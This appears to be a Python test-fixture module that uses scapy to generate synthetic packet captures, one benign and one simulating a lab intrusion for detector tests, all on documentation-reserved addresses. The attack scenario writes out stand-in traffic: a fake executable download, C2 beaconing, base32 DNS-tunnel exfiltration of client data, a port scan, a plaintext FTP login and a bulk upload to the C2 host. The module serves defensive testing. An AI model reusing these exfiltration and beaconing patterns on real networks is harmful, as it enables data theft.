"""Synthetic PCAP builders for demos and tests (RFC 5737 / .example only)."""
from __future__ import annotations

import base64
import random
from datetime import datetime, timezone
from pathlib import Path

from scapy.all import DNS, DNSQR, DNSRR, IP, TCP, UDP, Ether, Raw, wrpcap

VICTIM = "10.10.0.21"
C2 = "203.0.113.66"
DROP = "198.51.100.23"
FS = "10.10.0.5"
SCANNER = "10.10.0.99"
# RFC 5737 / RFC 2606 names for the TLS SNI fixture (issue #1).
TLS_SERVER = "198.51.100.80"
TLS_SNI_HOST = "login.example"


class _PcapBuilder:
    def __init__(self, seed: int = 1337) -> None:
        self.rng = random.Random(seed)
        self.base = datetime(2026, 10, 2, 8, 59, 0, tzinfo=timezone.utc).timestamp()
        self.packets: list = []
        self.macs: dict[str, str] = {}

    def mac(self, ip: str) -> str:
        if ip not in self.macs:
            self.macs[ip] = "02:00:00:{:02x}:{:02x}:{:02x}".format(*tuple(
                self.rng.randrange(256) for _ in range(3)
            ))
        return self.macs[ip]

    def add(self, pkt, t: float) -> None:
        framed = Ether(src=self.mac(pkt[IP].src), dst=self.mac(pkt[IP].dst)) / pkt
        framed.time = self.base + t
        self.packets.append(framed)

    def dns(self, client: str, name: str, answer: str, t: float, qtype: str = "A") -> None:
        sport = self.rng.randrange(30000, 60000)
        q = (
            IP(src=client, dst="10.10.0.1")
            / UDP(sport=sport, dport=53)
            / DNS(id=self.rng.randrange(65535), rd=1, qd=DNSQR(qname=name, qtype=qtype))
        )
        self.add(q, t)
        rr = DNSRR(rrname=name, type=qtype, ttl=60, rdata=answer)
        r = (
            IP(src="10.10.0.1", dst=client)
            / UDP(sport=53, dport=sport)
            / DNS(id=q[DNS].id, qr=1, aa=0, rd=1, ra=1, qd=q[DNS].qd, an=rr)
        )
        self.add(r, t + 0.02)

    def tcp_session(
        self,
        cli: str,
        srv: str,
        dport: int,
        client_payloads: list[bytes],
        server_payloads: list[bytes],
        t: float,
        mss: int = 1400,
    ) -> float:
        sport = self.rng.randrange(40000, 65000)
        cseq = self.rng.randrange(2**31)
        sseq = self.rng.randrange(2**31)
        self.add(IP(src=cli, dst=srv) / TCP(sport=sport, dport=dport, flags="S", seq=cseq), t)
        self.add(
            IP(src=srv, dst=cli)
            / TCP(sport=dport, dport=sport, flags="SA", seq=sseq, ack=cseq + 1),
            t + 0.01,
        )
        cseq += 1
        sseq += 1
        self.add(
            IP(src=cli, dst=srv) / TCP(sport=sport, dport=dport, flags="A", seq=cseq, ack=sseq),
            t + 0.02,
        )
        t += 0.03
        for i in range(max(len(client_payloads), len(server_payloads))):
            pairs = (
                (client_payloads[i] if i < len(client_payloads) else b"", True),
                (server_payloads[i] if i < len(server_payloads) else b"", False),
            )
            for data, src_is_client in pairs:
                for off in range(0, len(data), mss):
                    chunk = data[off : off + mss]
                    if src_is_client:
                        self.add(
                            IP(src=cli, dst=srv)
                            / TCP(sport=sport, dport=dport, flags="PA", seq=cseq, ack=sseq)
                            / Raw(chunk),
                            t,
                        )
                        cseq += len(chunk)
                    else:
                        self.add(
                            IP(src=srv, dst=cli)
                            / TCP(sport=dport, dport=sport, flags="PA", seq=sseq, ack=cseq)
                            / Raw(chunk),
                            t,
                        )
                        sseq += len(chunk)
                    t += 0.005
        self.add(
            IP(src=cli, dst=srv) / TCP(sport=sport, dport=dport, flags="FA", seq=cseq, ack=sseq),
            t,
        )
        self.add(
            IP(src=srv, dst=cli)
            / TCP(sport=dport, dport=sport, flags="FA", seq=sseq, ack=cseq + 1),
            t + 0.01,
        )
        self.add(
            IP(src=cli, dst=srv)
            / TCP(sport=sport, dport=dport, flags="A", seq=cseq + 1, ack=sseq + 1),
            t + 0.02,
        )
        return t

    def http_get(
        self,
        cli: str,
        srv: str,
        host: str,
        path: str,
        body: bytes,
        ctype: str,
        t: float,
        ua: str | None = None,
    ) -> float:
        ua = ua or "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        req = (
            f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
            f"User-Agent: {ua}\r\nAccept: */*\r\n\r\n"
        ).encode()
        resp = (
            f"HTTP/1.1 200 OK\r\nContent-Type: {ctype}\r\n"
            f"Content-Length: {len(body)}\r\n\r\n"
        ).encode() + body
        return self.tcp_session(cli, srv, 80, [req], [resp], t)

    def write(self, path: Path) -> Path:
        self.packets.sort(key=lambda p: p.time)
        path = Path(path)
        path.parent.mkdir(parents=True, exist_ok=True)
        wrpcap(str(path), self.packets)
        return path


def build_client_hello(hostname: str | None = TLS_SNI_HOST) -> bytes:
    """Minimal TLS 1.2 ClientHello (RFC 8446 layout, RFC 6066 SNI).

    Bytes only — not a complete handshake. Used by tests and the synthetic
    PCAP builder. ``hostname=None`` emits a ClientHello with empty extensions.
    """
    if hostname:
        host = hostname.encode("ascii")
        # name_type(1) + name_len(2) + host
        server_name = b"\x00" + len(host).to_bytes(2, "big") + host
        sni_list = len(server_name).to_bytes(2, "big") + server_name
        sni_ext = (0).to_bytes(2, "big") + len(sni_list).to_bytes(2, "big") + sni_list
        extensions = len(sni_ext).to_bytes(2, "big") + sni_ext
    else:
        extensions = b"\x00\x00"

    # version + 32-byte random + empty session_id + one cipher + null compression
    body = (
        b"\x03\x03"
        + bytes(range(32))
        + b"\x00"
        + b"\x00\x02\x00\x2f"
        + b"\x01\x00"
        + extensions
    )
    handshake = b"\x01" + len(body).to_bytes(3, "big") + body
    return b"\x16\x03\x03" + len(handshake).to_bytes(2, "big") + handshake


def build_tls_sni_pcap(
    path: str | Path,
    hostname: str = TLS_SNI_HOST,
    client_hello: bytes | None = None,
) -> Path:
    """One TCP/443 flow whose first payload is a TLS ClientHello."""
    b = _PcapBuilder(seed=7)
    payload = client_hello if client_hello is not None else build_client_hello(hostname)
    b.tcp_session(VICTIM, TLS_SERVER, 443, [payload], [b""], 10.0)
    return b.write(Path(path))


def build_clean_pcap(path: str | Path) -> Path:
    """Benign browsing only — should produce zero findings."""
    b = _PcapBuilder(seed=42)
    sites = [
        ("intranet.corp.example", "10.10.0.10"),
        ("news.example", "192.0.2.80"),
        ("weather.example", "192.0.2.81"),
    ]
    for i, (name, ip) in enumerate(sites):
        b.dns(VICTIM, name, ip, 5 + i * 20)
        b.http_get(
            VICTIM, ip, name, "/", b"<html><body>ordinary page</body></html>",
            "text/html", 5.1 + i * 20,
        )
    return b.write(Path(path))


def build_attack_pcap(path: str | Path) -> Path:
    """Full lab scenario covering all six detection classes."""
    b = _PcapBuilder(seed=1337)
    sites = [
        ("intranet.corp.example", "10.10.0.10"),
        ("news.example", "192.0.2.80"),
        ("weather.example", "192.0.2.81"),
    ]
    for i, (name, ip) in enumerate(sites):
        b.dns(VICTIM, name, ip, 5 + i * 20)
        b.http_get(
            VICTIM, ip, name, "/", b"<html><body>ordinary page</body></html>",
            "text/html", 5.1 + i * 20,
        )

    b.dns(VICTIM, "update-cdn.example", DROP, 180)
    fake_pe = (
        b"MZ\x90\x00"
        + b"\x00" * 60
        + b"This program cannot be run in DOS mode.\r\n"
        + bytes(b.rng.randrange(256) for _ in range(4000))
    )
    b.http_get(
        VICTIM, DROP, "update-cdn.example", "/files/invoice_0925.exe",
        fake_pe, "application/octet-stream", 180.1,
    )

    for n in range(15):
        t = 300 + n * 60 + b.rng.uniform(-2, 2)
        req = (
            f"GET /api/v1/ping?id=WS21-{n:03d} HTTP/1.1\r\n"
            f"Host: {C2}\r\nUser-Agent: python-requests/2.31\r\n\r\n"
        ).encode()
        b.tcp_session(
            VICTIM, C2, 8080, [req],
            [b"HTTP/1.1 200 OK\r\nContent-Length: 4\r\n\r\nidle"], t,
        )

    secret = b"client_list.csv:Acme Ltd,250000;Globex,410000;Initech,95000;" * 3
    enc = base64.b32encode(secret).decode().rstrip("=").lower()
    for i in range(0, len(enc), 50):
        b.dns(
            VICTIM,
            f"{enc[i:i+50]}.{i//50}.exfil-tunnel.example",
            "203.0.113.53",
            600 + i / 25,
            qtype="A",
        )

    open_ports = {21, 22, 80, 445}
    for i, port in enumerate(b.rng.sample(range(1, 1025), 200) + sorted(open_ports)):
        t = 780 + i * 0.01
        sp = b.rng.randrange(40000, 65000)
        b.add(
            IP(src=SCANNER, dst=FS)
            / TCP(sport=sp, dport=port, flags="S", seq=b.rng.randrange(2**31)),
            t,
        )
        if port in open_ports:
            b.add(IP(src=FS, dst=SCANNER) / TCP(sport=port, dport=sp, flags="SA"), t + 0.001)
            b.add(IP(src=SCANNER, dst=FS) / TCP(sport=sp, dport=port, flags="R"), t + 0.002)
        else:
            b.add(IP(src=FS, dst=SCANNER) / TCP(sport=port, dport=sp, flags="RA"), t + 0.001)

    b.tcp_session(
        SCANNER, FS, 21,
        [b"USER backup_admin\r\n", b"PASS Summer2026!\r\n", b"LIST\r\n", b"QUIT\r\n"],
        [
            b"220 FileServer FTP ready\r\n",
            b"331 Password required\r\n",
            b"230 Login successful\r\n",
            b"150 Here comes the listing\r\n226 Done\r\n",
            b"221 Goodbye\r\n",
        ],
        900,
    )

    blob = bytes(b.rng.randrange(256) for _ in range(250_000))
    post = (
        f"POST /upload HTTP/1.1\r\nHost: {C2}:8080\r\n"
        f"User-Agent: python-requests/2.31\r\n"
        f"Content-Type: application/octet-stream\r\n"
        f"Content-Length: {len(blob)}\r\n\r\n"
    ).encode() + blob
    b.tcp_session(
        VICTIM, C2, 8080, [post],
        [b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok"], 1260,
    )
    return b.write(Path(path))
